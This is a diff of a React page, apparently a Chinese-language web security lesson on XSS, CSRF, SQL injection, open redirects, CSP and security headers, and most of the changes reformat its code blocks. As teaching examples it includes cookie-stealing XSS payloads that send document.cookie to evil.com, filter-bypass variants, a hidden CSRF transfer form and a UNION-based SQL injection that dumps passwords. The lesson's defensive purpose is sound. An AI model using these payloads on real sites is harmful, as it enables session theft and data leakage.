@@ -95,17 +95,20 @@ export default function WebDevEP30() {
               </div>
 
               <h3 className="text-lg font-bold text-gray-700 mb-3">Reflected XSS 攻擊示例</h3>
-              <CodeBlock language="bash">{`# 攻擊者構造一個惡意 URL 發給受害者：
+              <CodeBlock language="bash">
+{` # 攻擊者構造一個惡意 URL 發給受害者：
 https://example.com/search?q=<script>
   document.location='https://evil.com/steal?cookie='+document.cookie
 </script>
 
 # 如果服務器直接把 q 的值插入 HTML 回應：
 # <p>搜尋結果：<script>document.location='...'</script></p>
-# 用戶點開連結，Cookie 就被偷走了`}</CodeBlock>
+# 用戶點開連結，Cookie 就被偷走了 `}
+</CodeBlock>
 
               <h3 className="text-lg font-bold text-gray-700 mb-3 mt-8">Stored XSS 攻擊示例（最危險）</h3>
-              <CodeBlock language="javascript">{`// 攻擊者在留言框輸入以下內容：
+              <CodeBlock language="javascript">
+{` // 攻擊者在留言框輸入以下內容：
 // <script>
 //   fetch('https://evil.com/steal?cookie=' + document.cookie)
 // </script>
@@ -117,10 +120,12 @@ https://example.com/search?q=<script>
 // 更隱蔽的版本（繞過簡單過濾）：
 // <img src="x" onerror="fetch('https://evil.com/?c='+document.cookie)">
 // <svg onload="eval(atob('base64編碼的惡意程式碼'))">
-// <a href="javascript:void(fetch('https://evil.com'))">點我</a>`}</CodeBlock>
+// <a href="javascript:void(fetch('https://evil.com'))">點我</a> `}
+</CodeBlock>
 
               <h3 className="text-lg font-bold text-gray-700 mb-3 mt-8">React 前端防禦</h3>
-              <CodeBlock language="tsx">{`// ✅ React 預設安全：JSX 自動 escape HTML 特殊字元
+              <CodeBlock language="tsx">
+{` // ✅ React 預設安全：JSX 自動 escape HTML 特殊字元
 function Comment({ text }: { text: string }) {
   return <p>{text}</p>;
   // 即使 text = "<script>alert('xss')</script>"
@@ -154,10 +159,12 @@ function SafeHtmlContent({ html }: { html: string }) {
       className="prose max-w-none"
     />
   );
-}`}</CodeBlock>
+} `}
+</CodeBlock>
 
               <h3 className="text-lg font-bold text-gray-700 mb-3 mt-8">後端 Node.js 防禦</h3>
-              <CodeBlock language="typescript">{`// 方法 1：使用 html-escaper 轉義輸出
+              <CodeBlock language="typescript">
+{` // 方法 1：使用 html-escaper 轉義輸出
 import { escape } from 'html-escaper';
 
 app.post('/api/comments', (req, res) => {
@@ -187,7 +194,8 @@ app.post('/api/search', (req, res) => {
 function validateUsername(username: string): boolean {
   // 只允許英文、數字、底線、連字號，1-30 字元
   return /^[a-zA-Z0-9_-]{1,30}$/.test(username);
-}`}</CodeBlock>
+} `}
+</CodeBlock>
             </CardBody>
           </Card>
         </motion.div>
@@ -212,7 +220,8 @@ function validateUsername(username: string): boolean {
               </p>
 
               <h3 className="text-lg font-bold text-gray-700 mb-3">攻擊原理（銀行轉帳示例）</h3>
-              <CodeBlock language="bash">{`# 攻擊步驟：
+              <CodeBlock language="bash">
+{` # 攻擊步驟：
 # 1. 用戶登入了 bank.com，瀏覽器儲存了 bank.com 的 Session Cookie
 # 2. 用戶訪問了 evil.com（可能是誤點廣告、釣魚郵件中的連結）
 # 3. evil.com 的頁面包含以下隱藏內容：
@@ -228,10 +237,12 @@ function validateUsername(username: string): boolean {
 # <script>document.getElementById('evil-form').submit();</script>
 
 # 4. 瀏覽器自動帶上 bank.com 的 Cookie 發出請求
-# 5. 伺服器看到有效的 Session，以為是用戶自己操作，執行轉帳！`}</CodeBlock>
+# 5. 伺服器看到有效的 Session，以為是用戶自己操作，執行轉帳！ `}
+</CodeBlock>
 
               <h3 className="text-lg font-bold text-gray-700 mb-3 mt-8">防禦方式 1：CSRF Token（最常用）</h3>
-              <CodeBlock language="typescript">{`// ─── 後端（Express）───
+              <CodeBlock language="typescript">
+{` // ─── 後端（Express）───
 import crypto from 'crypto';
 
 // 1. 每次生成表單時，產生唯一的 CSRF Token
@@ -280,10 +291,12 @@ function TransferForm() {
     });
     return response.json();
   };
-}`}</CodeBlock>
+} `}
+</CodeBlock>
 
               <h3 className="text-lg font-bold text-gray-700 mb-3 mt-8">防禦方式 2：SameSite Cookie（現代首選）</h3>
-              <CodeBlock language="typescript">{`// 設定 Cookie 的 SameSite 屬性
+              <CodeBlock language="typescript">
+{` // 設定 Cookie 的 SameSite 屬性
 // 這是目前最簡單有效的 CSRF 防禦方式
 res.cookie('sessionId', sessionToken, {
   httpOnly: true,       // JS 無法用 document.cookie 讀取
@@ -301,10 +314,12 @@ res.cookie('sessionId', sessionToken, {
 // none   → 用於第三方嵌入（例如嵌入到其他網站的 iframe），必須配合 secure
 
 // 注意：SameSite 在舊版瀏覽器（IE11、Chrome < 51）不支援
-// 需要同時保留 CSRF Token 作為後備防禦`}</CodeBlock>
+// 需要同時保留 CSRF Token 作為後備防禦 `}
+</CodeBlock>
 
               <h3 className="text-lg font-bold text-gray-700 mb-3 mt-8">防禦方式 3：Origin / Referer 標頭檢查</h3>
-              <CodeBlock language="typescript">{`// Origin Header 檢查：驗證請求來源
+              <CodeBlock language="typescript">
+{` // Origin Header 檢查：驗證請求來源
 app.use('/api', (req, res, next) => {
   // 只檢查會改變狀態的請求（POST、PUT、DELETE、PATCH）
   if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
@@ -336,7 +351,8 @@ app.use('/api', (req, res, next) => {
 });
 
 // 注意：Origin/Referer 可能被隱私設定或代理移除
-// 不應單獨依賴，應與 SameSite Cookie 或 CSRF Token 配合使用`}</CodeBlock>
+// 不應單獨依賴，應與 SameSite Cookie 或 CSRF Token 配合使用 `}
+</CodeBlock>
             </CardBody>
           </Card>
         </motion.div>
@@ -368,7 +384,8 @@ app.use('/api', (req, res, next) => {
               </div>
 
               <h3 className="text-lg font-bold text-gray-700 mb-3">Express 中設定 CSP</h3>
-              <CodeBlock language="typescript">{`// Express middleware 手動設定 CSP Header
+              <CodeBlock language="typescript">
+{` // Express middleware 手動設定 CSP Header
 app.use((req, res, next) => {
   res.setHeader('Content-Security-Policy', [
     // 預設：只允許來自自己的來源（same-origin）
@@ -418,10 +435,12 @@ app.post('/csp-violation-report', express.json({ type: 'application/csp-report' 
     documentUri: report['document-uri'],
   });
   res.status(204).send();
-});`}</CodeBlock>
+}); `}
+</CodeBlock>
 
               <h3 className="text-lg font-bold text-gray-700 mb-3 mt-8">Next.js 設定 CSP（next.config.js）</h3>
-              <CodeBlock language="javascript">{`// next.config.js
+              <CodeBlock language="javascript">
+{` // next.config.js
 const nextConfig = {
   async headers() {
     return [
@@ -469,7 +488,8 @@ const nextConfig = {
   },
 };
 
-module.exports = nextConfig;`}</CodeBlock>
+module.exports = nextConfig; `}
+</CodeBlock>
 
               <div className="mt-6 p-4 bg-amber-50 rounded-lg border border-amber-200">
                 <div className="flex items-start gap-2">
@@ -506,9 +526,10 @@ module.exports = nextConfig;`}</CodeBlock>
               </p>
 
               <h3 className="text-lg font-bold text-gray-700 mb-3">攻擊示例</h3>
-              <CodeBlock language="typescript">{`// ❌ 危險：直接拼接用戶輸入到 SQL 字串中
+              <CodeBlock language="typescript">
+{` // ❌ 危險：直接拼接用戶輸入到 SQL 字串中
 async function findUser(email: string) {
-  const query = \`SELECT * FROM users WHERE email = '\${email}'\`;
+  const query = \\`SELECT * FROM users WHERE email = '\\${email}'\\`;
   return await db.execute(query);
 }
 
@@ -524,10 +545,12 @@ async function findUser(email: string) {
 // 資料洩露攻擊（UNION-based）：
 // 輸入：' UNION SELECT username, password, email, 4 FROM users --
 // 生成：SELECT * FROM users WHERE id='' UNION SELECT username, password, email, 4 FROM users --
-// 結果：所有用戶的密碼被讀出`}</CodeBlock>
+// 結果：所有用戶的密碼被讀出 `}
+</CodeBlock>
 
               <h3 className="text-lg font-bold text-gray-700 mb-3 mt-8">正確防禦方式</h3>
-              <CodeBlock language="typescript">{`// ✅ 方式 1：參數化查詢（Parameterized Query）— 永遠使用這個
+              <CodeBlock language="typescript">
+{` // ✅ 方式 1：參數化查詢（Parameterized Query）— 永遠使用這個
 // 參數用佔位符 $1、$2 表示，實際值獨立傳入，資料庫 driver 負責轉義
 async function findUser(email: string) {
   const result = await db.query(
@@ -580,10 +603,11 @@ async function getUsers(sortBy: string, sortOrder: string) {
 
   // 排序欄位從白名單取得，值部分用參數化
   return await db.query(
-    \`SELECT * FROM users ORDER BY \${sortBy} \${sortOrder} LIMIT $1 OFFSET $2\`,
+    \\`SELECT * FROM users ORDER BY \\${sortBy} \\${sortOrder} LIMIT $1 OFFSET $2\\`,
     [limit, offset]
   );
-}`}</CodeBlock>
+} `}
+</CodeBlock>
 
               <div className="mt-6 grid md:grid-cols-2 gap-4">
                 <div className="p-4 bg-red-50 rounded-lg border border-red-200">
@@ -695,7 +719,8 @@ async function getUsers(sortBy: string, sortOrder: string) {
               </div>
 
               <h3 className="text-lg font-bold text-gray-700 mb-3">Open Redirect 的正確防禦</h3>
-              <CodeBlock language="typescript">{`// ❌ 危險：直接使用 URL 參數中的 redirect 目的地
+              <CodeBlock language="typescript">
+{` // ❌ 危險：直接使用 URL 參數中的 redirect 目的地
 app.get('/login', (req, res) => {
   const redirectTo = req.query.redirect;
   // 如果 redirect = 'https://evil.com/phishing'
@@ -736,7 +761,8 @@ app.get('/oauth/callback', (req, res) => {
   } else {
     res.redirect('/');
   }
-});`}</CodeBlock>
+}); `}
+</CodeBlock>
             </CardBody>
           </Card>
         </motion.div>
@@ -761,7 +787,8 @@ app.get('/oauth/callback', (req, res) => {
               </p>
 
               <h3 className="text-lg font-bold text-gray-700 mb-3">使用 Helmet（最快的方式）</h3>
-              <CodeBlock language="typescript">{`// npm install helmet
+              <CodeBlock language="typescript">
+{` // npm install helmet
 import helmet from 'helmet';
 import express from 'express';
 
@@ -822,7 +849,8 @@ app.use(
     // 例如禁止使用攝影機、麥克風、地理位置
     // 需要額外設定，helmet 暫不直接支援
   })
-);`}</CodeBlock>
+); `}
+</CodeBlock>
 
               <h3 className="text-lg font-bold text-gray-700 mb-3 mt-8">認識每個安全 Header</h3>
               <div className="space-y-3 mb-6">
@@ -884,7 +912,8 @@ app.use(
                 })}
               </div>
 
-              <CodeBlock language="typescript">{`// 驗證你的網站安全標頭：
+              <CodeBlock language="typescript">
+{` // 驗證你的網站安全標頭：
 // 1. securityheaders.com — 輸入你的網址，直接評分
 // 2. Mozilla Observatory — observatory.mozilla.org
 // 3. curl 命令檢查：
@@ -893,7 +922,8 @@ app.use(
 // 加上 helmet() 後，你的 Express 應用可以達到：
 // securityheaders.com 評分：A 或 A+
 // Mozilla Observatory 評分：A+
-// 這已經超越大多數商業網站的安全配置`}</CodeBlock>
+// 這已經超越大多數商業網站的安全配置 `}
+</CodeBlock>
 
               <div className="mt-6 p-5 bg-gradient-to-r from-red-900/10 to-rose-800/10 rounded-xl border border-red-200">
                 <div className="flex items-start gap-3">
